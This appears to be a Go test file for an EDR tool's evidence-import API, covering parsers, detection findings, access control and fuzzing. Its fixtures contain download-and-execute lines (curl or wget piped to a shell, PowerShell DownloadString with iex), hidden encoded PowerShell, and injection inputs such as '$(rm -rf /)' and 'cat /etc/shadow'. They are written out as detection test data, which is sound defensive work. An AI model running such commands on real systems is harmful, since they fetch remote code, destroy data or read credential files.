// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"bytes"
	"encoding/json"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const evPSAux = `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 169436 11900 ?        Ss   Nov01   0:03 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    Nov01   0:00 [kthreadd]
alice       4410  0.0  0.1  10000  3000 pts/0    Ss   10:00   0:00 -bash
alice       4421  0.2  0.1  20000  5000 pts/0    S+   10:01   0:00 bash -c curl http://203.0.113.50/x.sh | sh
`

const evPSEF = `UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 Nov01 ?        00:00:03 /sbin/init
alice       4410       1  0 10:00 pts/0    00:00:00 -bash
alice       4421    4410  0 10:01 pts/0    00:00:00 bash -c curl http://203.0.113.50/x.sh | sh
`

const evSS = `Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=812,fd=3))
tcp   ESTAB  0      0         10.0.0.5:51234   203.0.113.50:443   users:(("curl",pid=4421,fd=5))
udp   UNCONN 0      0          0.0.0.0:68        0.0.0.0:*
`

const evNetstatLinux = `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd
tcp        0      0 10.0.0.5:51234          203.0.113.50:443        ESTABLISHED 4421/curl
`

const evNetstatWin = `
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
  TCP    10.0.0.7:49712         198.51.100.9:443       ESTABLISHED     4120
  UDP    0.0.0.0:123            *:*                                    1024
`

const evLsof = `COMMAND  PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd     812  root    3u  IPv4  12345      0t0  TCP *:22 (LISTEN)
curl    4421 alice    5u  IPv4  54321      0t0  TCP 10.0.0.5:51234->203.0.113.50:443 (ESTABLISHED)
`

const evCrontab = `# m h dom mon dow command
MAILTO=root
*/5 * * * * curl -s http://203.0.113.50/p.sh | bash
@reboot /usr/local/bin/backup.sh
`

const evCronSys = `SHELL=/bin/sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
`

const evCronLs = `/etc/cron.d:
total 12
-rw-r--r--  1 root root  201 Nov  1 10:00 e2scrub_all
-rw-r--r--  1 root root  120 Nov 10 03:00 .hidden-job
`

const evUnitFiles = `UNIT FILE                 STATE    PRESET
ssh.service               enabled  enabled
evil-miner.service        enabled  disabled

2 unit files listed.
`

const evUnits = `  UNIT                  LOAD   ACTIVE SUB     DESCRIPTION
  ssh.service           loaded active running OpenBSD Secure Shell server
● foo.service           loaded failed failed  Foo

LOAD   = Reflects whether the unit definition was properly loaded.
`

const evLaunchctl = "PID\tStatus\tLabel\n-\t0\tcom.apple.example\n412\t0\tcom.evil.agent\n"

const evHistory = "#1700000000\ncurl http://203.0.113.50/x | sh\nls -la\n: 1700000100:0;wget -qO- http://198.51.100.7/a | bash\n"

const evTasklistCSV = `"Image Name","PID","Session Name","Session#","Mem Usage","Status","User Name","CPU Time","Window Title"
"System Idle Process","0","Services","0","8 K","Unknown","NT AUTHORITY\SYSTEM","7:12:03","N/A"
"powershell.exe","4120","Console","1","60,000 K","Running","CORP\bob","0:00:02","N/A"
`

const evTasklistTable = `
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System                           4 Services                   0        140 K
powershell.exe                4120 Console                    1     60,000 K
`

const evWMIC = "Node,CommandLine,Name,ProcessId\r\nHOST1,\"C:\\Windows\\System32\\cmd.exe\" /c whoami,cmd.exe,4132\r\nHOST1,powershell.exe -nop -w hidden -enc SQBFAFgA,powershell.exe,4140\r\n"

const evSchtasks = `"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State","Idle Time","Power Management","Run As User"
"WS1","\Updater","N/A","Ready","Interactive/Background","11/1/2026 1:00:00 AM","0","bob","powershell.exe -nop -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://203.0.113.50/a')","N/A","N/A","Enabled","Disabled","Stop On Battery Mode","bob"
"WS1","\Legacy","N/A","Ready","Interactive","N/A","0","x","COM handler","N/A","N/A","Enabled","Disabled","","SYSTEM"
`

const evRegExport = `Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Updater"="C:\\Users\\bob\\AppData\\Roaming\\upd.exe -silent"
"Blob"=hex:01,02,03,\
  04,05

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
"Sec"="powershell -w hidden -enc SQBFAFgA"
`

const evRegQuery = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    OneDrive    REG_SZ    "C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
`

const evAuth = `Nov 12 10:15:01 web1 sshd[812]: Failed password for invalid user admin from 203.0.113.9 port 51234 ssh2
Nov 12 10:15:09 web1 sshd[812]: Accepted publickey for alice from 198.51.100.4 port 40000 ssh2
Nov 12 10:16:00 web1 CRON[1]: unrelated line
`

const evPasswd = "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/bash\n"
const evDpkg = "Desired=Unknown/Install/Remove/Purge/Hold\n||/ Name Version Architecture Description\n+++-==-==-==-==\nii  bash 5.1-2 amd64 GNU Bourne Again SHell\nii  curl 7.81 amd64 transfer tool\n"
const evRPM = "bash-5.1.8-6.el9.x86_64\ncurl-7.76.1-14.el9.x86_64\n"

func evParse(t *testing.T, name, hint, content string) ([]evItem, evStat) {
	t.Helper()
	return evParseArtefact(name, hint, []byte(content), &evCtx{base: time.Date(2026, 11, 13, 12, 0, 0, 0, time.UTC)})
}

func TestEvidenceGoldenParsers(t *testing.T) {
	cases := []struct {
		name, hint, text, format string
		events, wantParsed       int
		typ                      string
	}{
		{"ps aux", "", evPSAux, "ps", 3, 3, "process"},
		{"ps -ef", "", evPSEF, "ps", 3, 3, "process"},
		{"ss -tunap", "", evSS, "ss", 1, 1, "network"},
		{"netstat -antp", "", evNetstatLinux, "netstat", 1, 1, "network"},
		{"netstat -ano", "", evNetstatWin, "netstat", 1, 1, "network"},
		{"lsof -i", "", evLsof, "lsof", 1, 1, "network"},
		{"crontab -l", "", evCrontab, "crontab", 2, 2, "process"},
		{"/etc/crontab", "", evCronSys, "crontab_system", 1, 1, "process"},
		{"cron listing", "", evCronLs, "ls", 2, 2, "file"},
		{"systemctl list-unit-files", "", evUnitFiles, "systemd_unit_files", 2, 2, "file"},
		{"systemctl list-units", "", evUnits, "systemd_units", 2, 2, "file"},
		{"launchctl list", "", evLaunchctl, "launchctl", 2, 2, "file"},
		{"bash_history", "", evHistory, "history", 3, 3, "process"},
		{"tasklist /v csv", "", evTasklistCSV, "tasklist", 2, 2, "process"},
		{"tasklist", "", evTasklistTable, "tasklist", 2, 2, "process"},
		{"wmic process csv", "", evWMIC, "process_csv", 2, 2, "process"},
		{"schtasks /query /fo csv /v", "", evSchtasks, "schtasks", 1, 1, "process"},
		{"run key export", "", evRegExport, "reg", 2, 2, "registry"},
		{"reg query", "", evRegQuery, "reg", 1, 1, "registry"},
		{"auth.log", "", evAuth, "authlog", 2, 2, "auth"},
		{"passwd", "", evPasswd, "passwd", 0, 3, ""},
		{"dpkg -l", "", evDpkg, "dpkg", 0, 2, ""},
		{"rpm -qa", "", evRPM, "rpm", 0, 2, ""},
	}
	for _, c := range cases {
		items, st := evParse(t, c.name, c.hint, c.text)
		if st.Format != c.format || len(items) != c.events || st.Parsed != c.wantParsed || st.Status == "failed" {
			t.Errorf("%s: format=%s events=%d parsed=%d status=%s err=%q", c.name, st.Format, len(items), st.Parsed, st.Status, st.Error)
		}
		if c.typ != "" && len(items) > 0 && items[0].Type != c.typ {
			t.Errorf("%s: type %s want %s", c.name, items[0].Type, c.typ)
		}
		// Autodetect from content alone (an opaque name) must reach the same format where content is distinctive.
		switch c.format {
		case "crontab", "history", "filelist", "crontab_system":
			continue
		}
		if _, st2 := evParse(t, "upload.txt", "", c.text); st2.Format != c.format {
			t.Errorf("%s: sniffed %s want %s", c.name, st2.Format, c.format)
		}
	}
}

func TestEvidenceGoldenValues(t *testing.T) {
	items, _ := evParse(t, "ps -ef", "", evPSEF)
	last := items[len(items)-1]
	if last.PID != 4421 || last.PPID != 4410 || last.Parent != "bash" || last.Exe != "bash" || !strings.Contains(last.Cmd, "x.sh | sh") || last.UID != 1000 {
		t.Fatalf("ps -ef: %+v", last)
	}
	items, _ = evParse(t, "ss", "", evSS)
	if items[0].Dest != "203.0.113.50:443" || items[0].PID != 4421 || items[0].Exe != "curl" {
		t.Fatalf("ss: %+v", items[0])
	}
	items, _ = evParse(t, "netstat -ano", "", evNetstatWin)
	if items[0].Dest != "198.51.100.9:443" || items[0].PID != 4120 {
		t.Fatalf("netstat win: %+v", items[0])
	}
	items, _ = evParse(t, "history", "", evHistory)
	if items[0].Time.Unix() != 1700000000 || items[2].Time.Unix() != 1700000100 || items[1].Time.IsZero() == false {
		t.Fatalf("history times: %v %v %v", items[0].Time, items[1].Time, items[2].Time)
	}
	items, _ = evParse(t, "wmic", "", evWMIC)
	if items[0].PID != 4132 || !strings.Contains(items[0].Cmd, "/c whoami") {
		t.Fatalf("wmic: %+v", items[0])
	}
	items, _ = evParse(t, "reg", "", evRegExport)
	if items[0].Tel.ValueName != "Updater" || items[0].Tel.ValueData != `C:\Users\bob\AppData\Roaming\upd.exe -silent` || !strings.HasSuffix(items[0].Tel.Key, `\Run`) {
		t.Fatalf("reg: %+v", items[0].Tel)
	}
	items, _ = evParse(t, "auth", "", evAuth)
	if items[0].Tel.Outcome != "failure" || items[0].Tel.User != "admin" || items[1].Tel.Outcome != "success" || items[0].Time.Year() != 2026 {
		t.Fatalf("auth: %+v", items[0])
	}
	_, st := evParse(t, "passwd", "", evPasswd)
	if len(st.Notes) == 0 || !strings.Contains(st.Notes[0], "toor") {
		t.Fatalf("passwd notes: %v", st.Notes)
	}
	items, _ = evParse(t, "ls", "", evCronLs)
	if items[0].Path != "/etc/cron.d/e2scrub_all" {
		t.Fatalf("ls: %+v", items[0])
	}
}

func TestEvidenceHostileInputs(t *testing.T) {
	long := strings.Repeat("A", 100000)
	hostile := []string{
		"", "\x00\x00\x00", long, "\xff\xfe\x00\x00", "PID COMMAND\n" + long + " " + long, "\"a\",\"b\n\"\"\"\n",
		"[HKEY_X]\n\"" + long + "\"=\"" + long + "\"\n", "USER PID COMMAND\nx notanumber foo\nx 99999999999999999999 foo\n",
		"$(rm -rf /)\n`id`\n; cat /etc/shadow\n", "\u202e evil\n", "Netid State Recv-Q Send-Q Local Peer\ntcp ESTAB x\n",
	}
	for _, h := range append(hostile, "") {
		for _, f := range EvidenceFormats() {
			_, st := evParseArtefact("x", f, []byte(h), &evCtx{base: time.Now()})
			if st.Status == "" {
				t.Fatalf("no status for %q/%s", evClip(h, 20), f)
			}
		}
		evParseArtefact("x", "", []byte(h), &evCtx{base: time.Now()})
	}
	// Control and bidi characters never survive normalisation.
	s := evNormalizeText([]byte("a\x00b\x1b[31m\u202ec"))
	if strings.ContainsAny(s, "\x00\x1b\u202e") {
		t.Fatalf("not sanitised: %q", s)
	}
	// UTF-16LE with BOM (PowerShell redirect) decodes.
	u16 := []byte{0xFF, 0xFE}
	for _, r := range "ab\n" {
		u16 = append(u16, byte(r), 0)
	}
	if evNormalizeText(u16) != "ab\n" {
		t.Fatalf("utf16: %q", evNormalizeText(u16))
	}
	if _, st := evParse(t, "unknown.bin", "", "just some random text\nnothing here\n"); st.Status != "failed" || st.Format != "unknown" {
		t.Fatalf("unknown: %+v", st)
	}
}

func evAuthReq(r *http.Request) { r.Header.Set("Authorization", "Bearer tok") }

type evHarness struct {
	mux   *http.ServeMux
	store *Store
	dir   string
}

func newEvHarness(t *testing.T) *evHarness {
	t.Helper()
	dir := t.TempDir()
	st, err := NewStore(filepath.Join(dir, "findings.jsonl"), 1000)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	RegisterEvidenceImport(mux, "tok", st)
	return &evHarness{mux, st, dir}
}

func (h *evHarness) do(method, path, ct, body string, auth bool) *httptest.ResponseRecorder {
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	if ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	if auth {
		evAuthReq(req)
	}
	w := httptest.NewRecorder()
	h.mux.ServeHTTP(w, req)
	return w
}

func evJSONBody(host string, arts map[string]string) string {
	type a struct {
		Name    string `json:"name"`
		Content string `json:"content"`
	}
	var as []a
	for k, v := range arts {
		as = append(as, a{k, v})
	}
	b, _ := json.Marshal(map[string]any{"case": "ir1", "host": host, "artefacts": as})
	return string(b)
}

func evImport(t *testing.T, h *evHarness) EvidenceCase {
	t.Helper()
	w := h.do("POST", "/v1/evidence/import", "application/json", evJSONBody("web01", map[string]string{
		"ps -ef": evPSEF, "ss -tunap": evSS, "crontab -l": evCrontab, "history": evHistory,
		"schtasks": evSchtasks, "run key": evRegExport, "auth.log": evAuth, "junk": "???",
	}), true)
	if w.Code != 201 {
		t.Fatalf("import: %d %s", w.Code, w.Body.String())
	}
	var c EvidenceCase
	if err := json.Unmarshal(w.Body.Bytes(), &c); err != nil {
		t.Fatal(err)
	}
	return c
}

func TestEvidenceImportFindingsAndInventory(t *testing.T) {
	h := newEvHarness(t)
	c := evImport(t, h)
	if len(c.Artefacts) != 8 {
		t.Fatalf("inventory: %d", len(c.Artefacts))
	}
	failed := 0
	for _, a := range c.Artefacts {
		if a.Status == "failed" {
			failed++
		}
	}
	if failed != 1 {
		t.Fatalf("expected exactly the junk artefact to fail, got %d", failed)
	}
	if len(c.Findings) == 0 {
		t.Fatal("expected would-fire findings (curl | sh, hidden encoded powershell)")
	}
	rules := map[string]bool{}
	for _, f := range c.Findings {
		rules[f.Rule] = true
		if !strings.HasPrefix(f.Evidence.Host, "import:ir1:web01") || f.Artefact == "" || f.Line == 0 {
			t.Fatalf("finding provenance: %+v", f)
		}
	}
	if !rules["download-execute"] {
		t.Fatalf("download-execute did not fire: %v", rules)
	}
	if len(c.Timeline) == 0 || len(c.IOCs) == 0 {
		t.Fatalf("timeline=%d iocs=%d", len(c.Timeline), len(c.IOCs))
	}
	var sawIP bool
	for _, i := range c.IOCs {
		if i.Type == "ip" && i.Value == "203.0.113.50" {
			sawIP = true
		}
	}
	if !sawIP {
		t.Fatalf("203.0.113.50 not extracted: %+v", c.IOCs)
	}
	// export and retrieval
	w := h.do("GET", "/v1/evidence/cases/"+c.ID+"?download=1", "", "", true)
	if w.Code != 200 || !strings.Contains(w.Header().Get("Content-Disposition"), c.ID) {
		t.Fatalf("export: %d %v", w.Code, w.Header())
	}
	if w = h.do("GET", "/v1/evidence/cases", "", "", true); !strings.Contains(w.Body.String(), c.ID) {
		t.Fatal("list missing case")
	}
	if w = h.do("GET", "/v1/evidence/cases", "", "", false); w.Code != 401 {
		t.Fatalf("unauth list: %d", w.Code)
	}
	if w = h.do("DELETE", "/v1/evidence/cases/"+c.ID, "", "", true); w.Code != 200 {
		t.Fatalf("delete: %d", w.Code)
	}
	if w = h.do("GET", "/v1/evidence/cases/"+c.ID, "", "", true); w.Code != 404 {
		t.Fatalf("after delete: %d", w.Code)
	}
}

func TestEvidenceIsolationStoreUnchanged(t *testing.T) {
	h := newEvHarness(t)
	h.store.Append(Finding{ID: "pre", Time: time.Now(), Host: "real-host", Rule: "x", Severity: "low"})
	before := len(h.store.List())
	evFiles, evNets := len(h.store.ListFiles()), len(h.store.ListFiles())
	raw, _ := os.ReadFile(filepath.Join(h.dir, "findings.jsonl"))
	c := evImport(t, h)
	if len(c.Findings) == 0 {
		t.Fatal("need findings for the isolation proof to mean anything")
	}
	if len(h.store.List()) != before || len(h.store.ListFiles()) != evFiles || len(h.store.ListFiles()) != evNets {
		t.Fatal("import mutated the live store")
	}
	raw2, _ := os.ReadFile(filepath.Join(h.dir, "findings.jsonl"))
	if !bytes.Equal(raw, raw2) {
		t.Fatal("findings file changed by import")
	}
	ents, _ := os.ReadDir(h.dir)
	for _, e := range ents {
		if strings.Contains(e.Name(), "evidence") {
			t.Fatalf("unexpected persistence file without opt-in: %s", e.Name())
		}
	}
}

func TestEvidencePromoteAdminOnlyAndIdempotent(t *testing.T) {
	h := newEvHarness(t)
	c := evImport(t, h)
	// A non-admin session cannot promote (a request with no valid credential is 401).
	if w := h.do("POST", "/v1/evidence/cases/"+c.ID+"/promote", "", "", false); w.Code != 401 {
		t.Fatalf("anon promote: %d", w.Code)
	}
	if w := h.do("POST", "/v1/evidence/cases/ev-nope/promote", "", "", true); w.Code != 404 {
		t.Fatalf("missing: %d", w.Code)
	}
	w := h.do("POST", "/v1/evidence/cases/"+c.ID+"/promote", "", "", true)
	if w.Code != 200 {
		t.Fatalf("promote: %d %s", w.Code, w.Body.String())
	}
	live := h.store.List()
	if len(live) != len(c.Findings) {
		t.Fatalf("promoted %d want %d", len(live), len(c.Findings))
	}
	for _, f := range live {
		tagged := false
		for _, tg := range f.Tags {
			if tg == "evidence-import" {
				tagged = true
			}
		}
		if !tagged || !strings.HasPrefix(f.Host, "import:ir1:web01") {
			t.Fatalf("promoted finding not tagged or not namespaced: %+v", f)
		}
	}
	if w = h.do("POST", "/v1/evidence/cases/"+c.ID+"/promote", "", "", true); w.Code != 409 {
		t.Fatalf("second promote: %d", w.Code)
	}
	if len(h.store.List()) != len(c.Findings) {
		t.Fatal("second promote wrote findings")
	}
	var got EvidenceCase
	json.Unmarshal(h.do("GET", "/v1/evidence/cases/"+c.ID, "", "", true).Body.Bytes(), &got)
	if !got.Promoted || got.PromotedAt == nil {
		t.Fatal("case not marked promoted")
	}
}

func TestEvidenceImpersonationGuard(t *testing.T) {
	h := newEvHarness(t)
	for _, bad := range []string{"", "import:x:y", "web01:evil", "a b", "../x", strings.Repeat("a", 65), "ho\x00st", "-lead"} {
		w := h.do("POST", "/v1/evidence/import", "application/json", evJSONBody(bad, map[string]string{"ps": evPSEF}), true)
		if w.Code != 400 {
			t.Errorf("host %q accepted: %d", bad, w.Code)
		}
	}
	// Even a label equal to an enrolled host name is namespaced: findings never carry a bare host.
	w := h.do("POST", "/v1/evidence/import", "application/json", evJSONBody("lab-host-01", map[string]string{"ps -ef": evPSEF}), true)
	var c EvidenceCase
	json.Unmarshal(w.Body.Bytes(), &c)
	if c.HostLabel != "import:ir1:lab-host-01" {
		t.Fatalf("host label %q", c.HostLabel)
	}
	for _, f := range c.Findings {
		if f.Evidence.Host != c.HostLabel {
			t.Fatalf("finding host %q", f.Evidence.Host)
		}
	}
	// Per-event hosts supplied inside artefact text are ignored (no field is honoured).
	w = h.do("POST", "/v1/evidence/import", "application/json", evJSONBody("web02", map[string]string{"history": "#1\n\"host\":\"agent-1\" curl http://1.2.3.4/x | sh\n"}), true)
	if strings.Contains(w.Body.String(), `"host":"agent-1","pid"`) {
		t.Fatal("artefact text influenced host")
	}
}

func TestEvidenceSizeCaps(t *testing.T) {
	h := newEvHarness(t)
	big := strings.Repeat("x", evMaxArtefact+1)
	w := h.do("POST", "/v1/evidence/import", "application/json", evJSONBody("web01", map[string]string{"ps": evPSEF, "history": big}), true)
	if w.Code != 201 {
		t.Fatalf("per-artefact cap should not reject the case: %d", w.Code)
	}
	var c EvidenceCase
	json.Unmarshal(w.Body.Bytes(), &c)
	oversized := 0
	for _, a := range c.Artefacts {
		if a.Status == "failed" && strings.Contains(a.Error, "size cap") {
			oversized++
		}
	}
	if oversized != 1 {
		t.Fatalf("oversized artefacts flagged: %d", oversized)
	}
	// Total cap: nine 4 MiB artefacts exceed 32 MiB.
	arts := map[string]string{}
	chunk := strings.Repeat("y", evMaxArtefact)
	for i := 0; i < 9; i++ {
		arts["a"+string(rune('0'+i))] = chunk
	}
	if w = h.do("POST", "/v1/evidence/import", "application/json", evJSONBody("web01", arts), true); w.Code != 413 {
		t.Fatalf("total cap: %d", w.Code)
	}
	// Multipart path honours per-artefact cap and routes by field name.
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mw.WriteField("host", "mp01")
	mw.WriteField("case", "mp")
	fw, _ := mw.CreateFormFile("ps -ef", "ps.txt")
	fw.Write([]byte(evPSEF))
	fw2, _ := mw.CreateFormFile("history", "h.txt")
	fw2.Write([]byte(big))
	mw.Close()
	w = h.do("POST", "/v1/evidence/import", mw.FormDataContentType(), buf.String(), true)
	if w.Code != 201 {
		t.Fatalf("multipart: %d %s", w.Code, w.Body.String())
	}
	json.Unmarshal(w.Body.Bytes(), &c)
	if c.HostLabel != "import:mp:mp01" || c.Artefacts[0].Format != "ps" || c.Artefacts[1].Status != "failed" {
		t.Fatalf("multipart case: %+v", c.Artefacts)
	}
}

func TestEvidenceRingAndPersistenceMetadataOnly(t *testing.T) {
	t.Setenv("KAVACH_EVIDENCE_PERSIST", "1")
	h := newEvHarness(t)
	var first string
	for i := 0; i < evMaxCases+3; i++ {
		c := evImport(t, h)
		if i == 0 {
			first = c.ID
		}
	}
	if w := h.do("GET", "/v1/evidence/cases/"+first, "", "", true); w.Code != 404 {
		t.Fatalf("ring did not evict oldest: %d", w.Code)
	}
	var list struct{ Count int }
	json.Unmarshal(h.do("GET", "/v1/evidence/cases", "", "", true).Body.Bytes(), &list)
	if list.Count != evMaxCases {
		t.Fatalf("count %d", list.Count)
	}
	b, err := os.ReadFile(filepath.Join(h.dir, "findings.jsonl.evidence.json"))
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{"x.sh", "203.0.113.50", "SQBFAFgA", "DownloadString", "curl -s", "Updater", "admin"} {
		if strings.Contains(string(b), secret) {
			t.Fatalf("persisted file leaks raw artefact text %q", secret)
		}
	}
	// Reload: cases return metadata only and cannot be promoted.
	mgr := newEvManager(filepath.Join(h.dir, "findings.jsonl"))
	if len(mgr.cases) != evMaxCases || !mgr.cases[0].MetadataOnly {
		t.Fatalf("reload: %d", len(mgr.cases))
	}
	if _, err, code := mgr.promote(mgr.cases[0].ID, h.store); err == nil || code != 409 {
		t.Fatalf("metadata-only promote: %v %d", err, code)
	}
	if len(h.store.List()) != 0 {
		t.Fatal("store touched")
	}
}

func TestEvidenceNoAuthOnImport(t *testing.T) {
	h := newEvHarness(t)
	if w := h.do("POST", "/v1/evidence/import", "application/json", evJSONBody("w", map[string]string{"ps": evPSEF}), false); w.Code != 401 {
		t.Fatalf("anon import: %d", w.Code)
	}
}

func evFuzzParser(f *testing.F, format, seed string) {
	f.Add(seed)
	f.Add("\x00\xff garbage \"\"\" ,,,")
	f.Fuzz(func(t *testing.T, s string) {
		evParseArtefact("fz", format, []byte(s), &evCtx{base: time.Unix(1700000000, 0)})
	})
}

func FuzzEvidencePS(f *testing.F)        { evFuzzParser(f, "ps", evPSEF) }
func FuzzEvidenceSS(f *testing.F)        { evFuzzParser(f, "ss", evSS) }
func FuzzEvidenceNetstat(f *testing.F)   { evFuzzParser(f, "netstat", evNetstatWin) }
func FuzzEvidenceLsof(f *testing.F)      { evFuzzParser(f, "lsof", evLsof) }
func FuzzEvidenceCron(f *testing.F)      { evFuzzParser(f, "crontab", evCrontab) }
func FuzzEvidenceCronSys(f *testing.F)   { evFuzzParser(f, "crontab_system", evCronSys) }
func FuzzEvidenceLs(f *testing.F)        { evFuzzParser(f, "ls", evCronLs) }
func FuzzEvidenceFilelist(f *testing.F)  { evFuzzParser(f, "filelist", "/etc/passwd\nC:\\x\n") }
func FuzzEvidenceUnitFiles(f *testing.F) { evFuzzParser(f, "systemd_unit_files", evUnitFiles) }
func FuzzEvidenceUnits(f *testing.F)     { evFuzzParser(f, "systemd_units", evUnits) }
func FuzzEvidenceLaunchctl(f *testing.F) { evFuzzParser(f, "launchctl", evLaunchctl) }
func FuzzEvidenceHistory(f *testing.F)   { evFuzzParser(f, "history", evHistory) }
func FuzzEvidenceTasklist(f *testing.F)  { evFuzzParser(f, "tasklist", evTasklistCSV) }
func FuzzEvidenceProcCSV(f *testing.F)   { evFuzzParser(f, "process_csv", evWMIC) }
func FuzzEvidenceSchtasks(f *testing.F)  { evFuzzParser(f, "schtasks", evSchtasks) }
func FuzzEvidenceReg(f *testing.F)       { evFuzzParser(f, "reg", evRegExport) }
func FuzzEvidenceAuth(f *testing.F)      { evFuzzParser(f, "authlog", evAuth) }
func FuzzEvidencePasswd(f *testing.F)    { evFuzzParser(f, "passwd", evPasswd) }
func FuzzEvidenceDpkg(f *testing.F)      { evFuzzParser(f, "dpkg", evDpkg) }
func FuzzEvidenceRPM(f *testing.F)       { evFuzzParser(f, "rpm", evRPM) }
func FuzzEvidenceSniff(f *testing.F)     { evFuzzParser(f, "", evSS) }
